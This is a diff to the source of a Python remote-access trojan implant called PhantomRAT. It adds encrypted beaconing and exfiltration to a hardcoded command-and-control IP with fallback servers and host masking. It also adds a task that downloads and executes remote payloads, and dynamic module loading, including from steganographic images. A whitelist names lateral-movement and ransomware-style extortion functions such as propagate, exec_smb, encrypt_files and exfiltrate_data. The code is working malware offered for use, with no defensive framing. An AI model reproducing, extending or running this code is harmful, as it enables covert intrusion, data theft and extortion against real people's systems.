@@ -20,68 +20,161 @@ import platform
 import psutil
 from datetime import datetime
 import subprocess
+import requests
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from phantomrat_modules import (
+    execute_module_function as dynamic_execute_module_function,
+    list_loaded_modules as dynamic_list_loaded_modules,
+    load_module as dynamic_load_module,
+)
+from phantomrat_readiness import generate_readiness_report
 
 # Configure minimal logging for stealth
 logging.getLogger().setLevel(logging.ERROR)
 
-# ==================== C2 CONFIGURATION v4.0 ====================
-C2_SERVER = "http://141.105.71.196:8000"  # Your C2 IP
-BEACON_ENDPOINT = "/phantom/beacon"
-EXFIL_ENDPOINT = "/phantom/exfil"
-IMPLANT_ID = None
-SESSION_ID = str(uuid.uuid4())[:8]  # New session ID for each run
-
-# User-Agent from malleable profile
+# ==================== PROFILE LOADING & C2 CONFIGURATION v2026 ====================
 try:
     with open('malleable_profile.json', 'r') as f:
         profile = json.load(f)
-        USER_AGENT = profile.get(
-            'security',
-            {}
-        ).get(
-            'user_agent',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-        )
-except:
-    USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+except Exception:
+    profile = {}
+
+PROFILE_YEAR = profile.get('profile_year', 2026)
+
+DEFAULT_USER_AGENT = (
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
+    'Chrome/110.0.5481.192 Safari/537.36'
+)
+USER_AGENT = profile.get('security', {}).get('user_agent', DEFAULT_USER_AGENT)
+
+DEFAULT_C2_SERVER = "http://141.105.71.196:8000"  # Your C2 IP
+c2_settings = profile.get('c2', {}) if profile else {}
+C2_SERVER = c2_settings.get('primary', DEFAULT_C2_SERVER)
+C2_FALLBACKS = [entry for entry in c2_settings.get('fallback', []) if entry]
+C2_VERIFY_SSL = bool(c2_settings.get('verify_ssl', False))
+C2_MASK_HOST = c2_settings.get('mask_host') or None
+C2_SNI = c2_settings.get('sni') or None
+C2_TIMEOUT = c2_settings.get('connection_timeout', 20)
+C2_RETRY = c2_settings.get('retry_attempts', 3)
+BEACON_JITTER_MIN = c2_settings.get('beacon_jitter_min', 20)
+BEACON_JITTER_MAX = c2_settings.get('beacon_jitter_max', 40)
+BEACON_ENDPOINT = c2_settings.get('beacon_endpoint', "/phantom/beacon")
+EXFIL_ENDPOINT = c2_settings.get('exfil_endpoint', "/phantom/exfil")
+IMPLANT_ID = None
+SESSION_ID = str(uuid.uuid4())[:8]  # New session ID for each run
 
 # ==================== ENCRYPTION COMPATIBLE WITH C2 v4.0 ====================
 def get_encryption_key():
     """Get encryption key compatible with C2 v4.0"""
+    env_key = os.environ.get("PHANTOM_ENCRYPTION_KEY")
+    if env_key:
+        return env_key.encode(), "environment"
+
     try:
         with open('malleable_profile.json', 'r') as f:
             profile = json.load(f)
             key = profile.get('encryption', {}).get('key')
             if key:
-                return key.encode()
+                return str(key).encode(), "malleable_profile"
     except:
         pass
-    
-    # Generate from system info (compatible with C2)
-    system_hash = hashlib.sha256(
-        f"{socket.gethostname()}{platform.machine()}{os.getpid()}".encode()
-    ).digest()
-    return system_hash[:32]  # Ensure 32 bytes
 
-ENCRYPTION_KEY = get_encryption_key()
+    # Default shared key used by the dashboard
+    return b"phantomrat_32_char_encryption_key_here", "default"
+
+ENCRYPTION_KEY, ENCRYPTION_SOURCE = get_encryption_key()
+KDF_SALT_FILE = os.path.join(os.path.dirname(__file__), 'phantomrat_kdf_salt.bin')
+KDF_ITERATIONS = 200_000
+
+
+def load_kdf_salt():
+    env_salt = os.environ.get("PHANTOM_KDF_SALT")
+    if env_salt:
+        try:
+            return bytes.fromhex(env_salt) if all(c in '0123456789abcdefABCDEF' for c in env_salt) else env_salt.encode()
+        except Exception:
+            pass
+
+    try:
+        with open(KDF_SALT_FILE, 'rb') as salt_file:
+            data = salt_file.read()
+            if data:
+                return data
+    except Exception:
+        pass
+
+    profile_salt = profile.get('encryption', {}).get('salt') if profile else None
+    if profile_salt:
+        if not isinstance(profile_salt, (bytes, bytearray)):
+            profile_salt = str(profile_salt).encode()
+        try:
+            with open(KDF_SALT_FILE, 'wb') as salt_file:
+                salt_file.write(profile_salt)
+        except Exception:
+            pass
+        return profile_salt
+
+    generated_salt = os.urandom(32)
+    try:
+        with open(KDF_SALT_FILE, 'wb') as salt_file:
+            salt_file.write(generated_salt)
+    except Exception:
+        pass
+    return generated_salt
+
+
+PROFILE_SALT = load_kdf_salt()
+PROFILE_ITERATIONS = profile.get('encryption', {}).get('iterations', KDF_ITERATIONS) if profile else KDF_ITERATIONS
+try:
+    PROFILE_ITERATIONS = int(PROFILE_ITERATIONS)
+except (TypeError, ValueError):
+    PROFILE_ITERATIONS = KDF_ITERATIONS
+
+
+def derive_fernet_key(secret: bytes) -> bytes:
+    """Derive a Fernet-compatible key using PBKDF2-HMAC-SHA256."""
+    if not isinstance(secret, (bytes, bytearray)):
+        secret = str(secret).encode()
+
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt=PROFILE_SALT,
+        iterations=PROFILE_ITERATIONS,
+    )
+    return base64.urlsafe_b64encode(kdf.derive(secret))
+
+def build_readiness_context():
+    salt_value = PROFILE_SALT.hex() if isinstance(PROFILE_SALT, (bytes, bytearray)) else PROFILE_SALT
+    return {
+        'c2_server': C2_SERVER,
+        'c2_fallbacks': C2_FALLBACKS,
+        'beacon_endpoint': BEACON_ENDPOINT,
+        'exfil_endpoint': EXFIL_ENDPOINT,
+        'user_agent': USER_AGENT,
+        'profile_source': 'malleable_profile' if 'profile' in globals() else 'default',
+        'profile_year': PROFILE_YEAR,
+        'encryption_source': ENCRYPTION_SOURCE,
+        'encryption_key': ENCRYPTION_KEY,
+        'kdf_salt': salt_value,
+        'kdf_iterations': PROFILE_ITERATIONS,
+        'mask_host': C2_MASK_HOST,
+        'verify_ssl': C2_VERIFY_SSL,
+    }
+
 
 # Encryption class compatible with C2 v4.0
 class PhantomEncryption:
     def __init__(self, key):
         from cryptography.fernet import Fernet
         import base64
-        
+
         if isinstance(key, str):
             key = key.encode()
-        
-        # Ensure key is 32 bytes
-        if len(key) < 32:
-            key = key.ljust(32, b'0')[:32]
-        elif len(key) > 32:
-            key = key[:32]
-        
-        # Generate Fernet key (must be 32 url-safe base64-encoded bytes)
-        fernet_key = base64.urlsafe_b64encode(key)
+
+        # Normalize key length and derive the same Fernet material used by C2
+        fernet_key = derive_fernet_key(key)
         self.fernet = Fernet(fernet_key)
     
     def encrypt(self, data):
@@ -283,18 +376,18 @@ def get_basic_system_info():
         'last_seen': time.time()
     }
 
-# ==================== C2 COMMUNICATION v4.0 ====================
-def send_to_c2(endpoint, data, method='POST', retry=3):
-    """Send encrypted data to C2 server v4.0"""
+# ==================== C2 COMMUNICATION v2026 ====================
+def send_to_c2(endpoint, data, method='POST', retry=None):
+    """Send encrypted data to C2 server v2026 with masking support."""
     import requests
-    
+
     global IMPLANT_ID
-    
+
     # Generate implant ID if not set
     if not IMPLANT_ID:
         host_hash = hashlib.sha256(socket.gethostname().encode()).hexdigest()[:12]
         IMPLANT_ID = f"PHANTOM-{host_hash.upper()}"
-    
+
     headers = {
         'User-Agent': USER_AGENT,
         'X-Phantom-ID': IMPLANT_ID,
@@ -302,72 +395,78 @@ def send_to_c2(endpoint, data, method='POST', retry=3):
         'X-Phantom-Version': '4.0',
         'Content-Type': 'application/octet-stream'
     }
-    
-    for attempt in range(retry):
-        try:
-            # Prepare payload
-            payload = {
-                'id': IMPLANT_ID,
-                'data': data,
-                'timestamp': time.time(),
-                'session': SESSION_ID,
-                'attempt': attempt + 1
-            }
-            
-            encrypted_data = encryption.encrypt(payload)
-            
-            url = f"{C2_SERVER}{endpoint}"
-            
-            if method.upper() == 'POST':
-                response = requests.post(
-                    url,
-                    data=encrypted_data,
-                    headers=headers,
-                    timeout=20,
-                    verify=False  # For testing, remove in production
-                )
-            else:
-                response = requests.get(
-                    url,
-                    headers=headers,
-                    timeout=20,
-                    verify=False
-                )
-            
-            if response.status_code == 200:
-                # Try to decrypt response for beacon endpoint
-                if endpoint == BEACON_ENDPOINT:
-                    try:
-                        decrypted = encryption.decrypt(response.content)
-                        return decrypted
-                    except:
-                        # If decryption fails, try to parse as plain JSON
+
+    if C2_MASK_HOST:
+        headers['Host'] = C2_MASK_HOST
+    if C2_SNI:
+        headers['X-Phantom-SNI'] = C2_SNI
+
+    attempts_allowed = retry if retry is not None else C2_RETRY
+    server_candidates = [C2_SERVER] + [fallback for fallback in C2_FALLBACKS if fallback != C2_SERVER]
+
+    for server in server_candidates:
+        for attempt in range(attempts_allowed):
+            try:
+                payload = {
+                    'id': IMPLANT_ID,
+                    'data': data,
+                    'timestamp': time.time(),
+                    'session': SESSION_ID,
+                    'attempt': attempt + 1
+                }
+
+                encrypted_data = encryption.encrypt(payload)
+
+                url = f"{server}{endpoint}"
+
+                if method.upper() == 'POST':
+                    response = requests.post(
+                        url,
+                        data=encrypted_data,
+                        headers=headers,
+                        timeout=C2_TIMEOUT,
+                        verify=C2_VERIFY_SSL
+                    )
+                else:
+                    response = requests.get(
+                        url,
+                        headers=headers,
+                        timeout=C2_TIMEOUT,
+                        verify=C2_VERIFY_SSL
+                    )
+
+                if response.status_code == 200:
+                    if endpoint == BEACON_ENDPOINT:
                         try:
-                            return json.loads(response.text)
-                        except:
-                            return {'tasks': []}
-                return {'status': 'success', 'code': response.status_code}
-            elif response.status_code in [404, 403]:
-                print(f"[!] C2 endpoint not found or forbidden: {endpoint}")
-                return {'status': 'error', 'code': response.status_code}
-            else:
+                            decrypted = encryption.decrypt(response.content)
+                            return decrypted
+                        except Exception:
+                            try:
+                                return json.loads(response.text)
+                            except Exception:
+                                return {'tasks': []}
+                    return {'status': 'success', 'code': response.status_code}
+                if response.status_code in [404, 403]:
+                    print(f"[!] C2 endpoint not found or forbidden: {endpoint}")
+                    break
+
                 print(f"[!] C2 responded with code: {response.status_code}")
-                if attempt < retry - 1:
-                    time.sleep(2 ** attempt)  # Exponential backoff
-                
-        except requests.exceptions.ConnectionError:
-            print(f"[!] Connection failed (attempt {attempt + 1}/{retry})")
-            if attempt < retry - 1:
-                time.sleep(3 * (attempt + 1))
-        except requests.exceptions.Timeout:
-            print(f"[!] Request timeout (attempt {attempt + 1}/{retry})")
-            if attempt < retry - 1:
-                time.sleep(2 * (attempt + 1))
-        except Exception as e:
-            print(f"[!] Request error: {e}")
-            if attempt < retry - 1:
-                time.sleep(2)
-    
+                if attempt < attempts_allowed - 1:
+                    time.sleep(2 ** attempt)
+
+            except requests.exceptions.ConnectionError:
+                print(f"[!] Connection failed (attempt {attempt + 1}/{attempts_allowed}) to {server}")
+                if attempt < attempts_allowed - 1:
+                    time.sleep(3 * (attempt + 1))
+            except requests.exceptions.Timeout:
+                print(f"[!] Request timeout (attempt {attempt + 1}/{attempts_allowed}) to {server}")
+                if attempt < attempts_allowed - 1:
+                    time.sleep(2 * (attempt + 1))
+            except Exception as e:
+                print(f"[!] Request error: {e}")
+                if attempt < attempts_allowed - 1:
+                    time.sleep(2)
+
     return {'status': 'failed', 'error': 'All retries exhausted'}
 
 def beacon_checkin():
@@ -566,6 +665,215 @@ def download_file(filepath, chunk_size=8192):
     except Exception as e:
         return {'error': str(e)}
 
+
+def parse_task_arguments(args):
+    """Normalize task arguments into a dictionary."""
+    if isinstance(args, dict):
+        return args
+
+    if isinstance(args, str) and args.strip():
+        try:
+            return json.loads(args)
+        except Exception:
+            return {'value': args}
+
+    return {}
+
+
+MODULE_WHITELIST = {}
+if 'profile' in globals():
+    MODULE_WHITELIST = profile.get('modules', {}).get('whitelist', {}) or {}
+if not MODULE_WHITELIST:
+    MODULE_WHITELIST = {
+        'phantomrat_lateral': ['scan_network', 'propagate', 'exec_ssh', 'exec_smb', 'exec_winrm'],
+        'phantomrat_extortion': ['encrypt_files', 'decrypt_files', 'exfiltrate_data', 'status'],
+        'phantomrat_modules': ['load_remote_module', 'list_cached_modules', 'evict_cache'],
+    }
+
+
+def _is_primitive(value):
+    return isinstance(value, (str, int, float, bool)) or value is None
+
+
+def _validate_value(value, depth=0, max_depth=2):
+    if depth > max_depth:
+        return False
+    if _is_primitive(value):
+        return True
+    if isinstance(value, (list, tuple)):
+        if len(value) > 25:
+            return False
+        return all(_validate_value(v, depth + 1, max_depth) for v in value)
+    if isinstance(value, dict):
+        if len(value) > 25:
+            return False
+        for k, v in value.items():
+            if not isinstance(k, str) or k.startswith('__'):
+                return False
+            if k.lower() in {'globals', 'locals', 'cls', 'func', 'func_code', 'code'}:
+                return False
+            if not _validate_value(v, depth + 1, max_depth):
+                return False
+        return True
+    return False
+
+
+def validate_module_call(module_name, function_name, function_args, function_kwargs):
+    allowed_functions = MODULE_WHITELIST.get(module_name)
+    if not allowed_functions:
+        raise ValueError('Module not whitelisted for dynamic execution')
+
+    if allowed_functions != ['*'] and function_name not in allowed_functions:
+        raise ValueError('Function not permitted for this module')
+
+    if not isinstance(function_args, (list, tuple)):
+        raise ValueError('Positional args must be a list or tuple')
+
+    if not isinstance(function_kwargs, dict):
+        raise ValueError('Keyword args must be provided as a dict')
+
+    if len(function_args) > 10:
+        raise ValueError('Too many positional arguments')
+
+    if len(function_kwargs) > 25:
+        raise ValueError('Too many keyword arguments')
+
+    if not _validate_value(function_args):
+        raise ValueError('Invalid positional argument types')
+
+    if not _validate_value(function_kwargs):
+        raise ValueError('Invalid keyword argument types')
+
+    return True
+
+
+def deploy_payload(payload_spec):
+    """Download or stage a payload and optionally execute it."""
+    spec = parse_task_arguments(payload_spec)
+
+    url = spec.get('url')
+    inline_content = spec.get('content')
+    destination = spec.get('destination')
+    if not destination:
+        import tempfile
+        destination = tempfile.mktemp(prefix='phantom_', dir=tempfile.gettempdir())
+    execute_now = bool(spec.get('execute', False))
+    interpreter = spec.get('interpreter')
+    mode = spec.get('mode', 'binary')
+    expected_hash = spec.get('sha256')  # Integrity check
+
+    if not url and not inline_content:
+        return {'success': False, 'error': 'No payload source provided (url or content)'}
+
+    try:
+        if url:
+            headers = {'User-Agent': USER_AGENT}
+            response = requests.get(url, headers=headers, timeout=25, verify=spec.get('verify_ssl', True))
+            response.raise_for_status()
+            payload_data = response.content
+            source = url
+        else:
+            payload_data = base64.b64decode(inline_content)
+            source = 'inline'
+
+        # Verify payload integrity if hash provided
+        if expected_hash:
+            actual_hash = hashlib.sha256(payload_data).hexdigest()
+            if actual_hash != expected_hash:
+                return {'success': False, 'error': 'Payload integrity check failed'}
+
+        os.makedirs(os.path.dirname(destination) or '.', exist_ok=True)
+        with open(destination, 'wb') as f:
+            f.write(payload_data)
+
+        result = {
+            'success': True,
+            'destination': destination,
+            'size': len(payload_data),
+            'source': source,
+        }
+
+        if execute_now:
+            if interpreter:
+                exec_cmd = [interpreter, destination]
+            elif mode == 'python':
+                exec_cmd = [sys.executable, destination]
+            else:
+                exec_cmd = [destination]
+
+            try:
+                proc = subprocess.run(
+                    exec_cmd,
+                    capture_output=True,
+                    text=True,
+                    timeout=60,
+                )
+                result['execution'] = {
+                    'command': exec_cmd,
+                    'returncode': proc.returncode,
+                    'stdout': proc.stdout[-2048:],
+                    'stderr': proc.stderr[-2048:],
+                }
+                result['success'] = proc.returncode == 0
+            except Exception as exec_err:
+                result['execution'] = {'error': str(exec_err)}
+                result['success'] = False
+
+        return result
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+
+def load_dynamic_module(module_args):
+    """Load a Phantom module from the C2, local path, or stego source."""
+    args = parse_task_arguments(module_args)
+    module_name = args.get('name') or args.get('module') or args.get('value')
+    source = args.get('source', 'remote')
+    kwargs = {}
+
+    if not module_name:
+        return {'success': False, 'error': 'No module name provided'}
+
+    if source == 'local':
+        kwargs['filepath'] = args.get('path') or args.get('filepath')
+    elif source == 'stego':
+        kwargs['image_path'] = args.get('image') or args.get('image_path')
+        kwargs['method'] = args.get('method', 'lsb')
+
+    loaded = dynamic_load_module(module_name, source=source, **kwargs)
+
+    return {
+        'success': loaded is not None,
+        'module': module_name,
+        'source': source,
+        'loaded': bool(loaded),
+        'loaded_modules': dynamic_list_loaded_modules(),
+    }
+
+
+def execute_dynamic_module(call_args):
+    """Execute a function from a previously loaded Phantom module."""
+    args = parse_task_arguments(call_args)
+    module_name = args.get('module') or args.get('name') or args.get('value')
+    function_name = args.get('function') or args.get('func')
+    function_args = args.get('args', [])
+    function_kwargs = args.get('kwargs', {})
+
+    if not module_name or not function_name:
+        return {'success': False, 'error': 'module and function required'}
+
+    try:
+        validate_module_call(module_name, function_name, function_args, function_kwargs)
+        result = dynamic_execute_module_function(module_name, function_name, *function_args, **function_kwargs)
+        return {
+            'success': True,
+            'module': module_name,
+            'function': function_name,
+            'result': result,
+        }
+    except Exception as e:
+        return {'success': False, 'error': str(e), 'module': module_name, 'function': function_name}
+
 def handle_command_v4(task):
     """Handle C2 v4.0 commands with improved error handling"""
     if not task or 'command' not in task:
@@ -592,7 +900,11 @@ def handle_command_v4(task):
         if cmd == 'sysinfo':
             result['output'] = get_comprehensive_system_info()
             result['success'] = True
-            
+
+        elif cmd == 'readiness_report':
+            result['output'] = generate_readiness_report(build_readiness_context())
+            result['success'] = True
+
         elif cmd == 'ping':
             result['output'] = {
                 'message': 'pong',
@@ -632,6 +944,11 @@ def handle_command_v4(task):
                 result['success'] = result['output'].get('success', False)
             else:
                 result['output'] = {'error': 'No file specified'}
+
+        # ========== PAYLOAD DEPLOYMENT ==========
+        elif cmd == 'deploy_payload':
+            result['output'] = deploy_payload(args)
+            result['success'] = result['output'].get('success', False)
                 
         elif cmd == 'cd':
             if args:
@@ -739,6 +1056,19 @@ def handle_command_v4(task):
                 result['success'] = True
             except Exception as e:
                 result['output'] = {'error': str(e)}
+
+        # ========== MODULE CONTROL ==========
+        elif cmd == 'load_module':
+            result['output'] = load_dynamic_module(args)
+            result['success'] = result['output'].get('success', False)
+
+        elif cmd == 'module_call':
+            result['output'] = execute_dynamic_module(args)
+            result['success'] = result['output'].get('success', False)
+
+        elif cmd == 'list_modules':
+            result['output'] = {'success': True, 'modules': dynamic_list_loaded_modules()}
+            result['success'] = True
                 
         # ========== PERSISTENCE COMMANDS ==========
         elif cmd == 'persist':
@@ -850,6 +1180,10 @@ def main_loop():
     
     print(f"[*] Starting PhantomRAT v4.0 Implant")
     print(f"[*] C2 Server: {C2_SERVER}")
+    if C2_FALLBACKS:
+        print(f"[*] C2 Fallbacks: {', '.join(C2_FALLBACKS)}")
+    if C2_MASK_HOST:
+        print(f"[*] Masked Host header: {C2_MASK_HOST}")
     print(f"[*] Session ID: {SESSION_ID}")
     print(f"[*] GUI Modules: {'Available' if GUI_MODULES_AVAILABLE else 'Not available'}")
     print(f"[*] Enhanced Info: {'Available' if SYSINFO_AVAILABLE else 'Not available'}")
@@ -870,8 +1204,11 @@ def main_loop():
     failed_beacons = 0
     max_failed_beacons = 5
     
+    sleep_min = max(1, min(BEACON_JITTER_MIN, BEACON_JITTER_MAX))
+    sleep_max = max(sleep_min + 1, max(BEACON_JITTER_MIN, BEACON_JITTER_MAX))
+
     print(f"[*] Entering main loop...")
-    print(f"[*] Beacon interval: 20-40 seconds")
+    print(f"[*] Beacon interval: {sleep_min}-{sleep_max} seconds")
     print(f"[*] Max failed beacons before backoff: {max_failed_beacons}")
     print("-" * 50)
     
@@ -954,7 +1291,7 @@ def main_loop():
             
             # ========== RANDOMIZED SLEEP ==========
             # Base sleep with jitter and random variance
-            base_sleep = random.uniform(20, 40)
+            base_sleep = random.uniform(sleep_min, sleep_max)
             print(f"[*] Sleeping for {base_sleep:.1f} seconds")
             obfuscated_sleep(base_sleep, jitter=0.3)
             
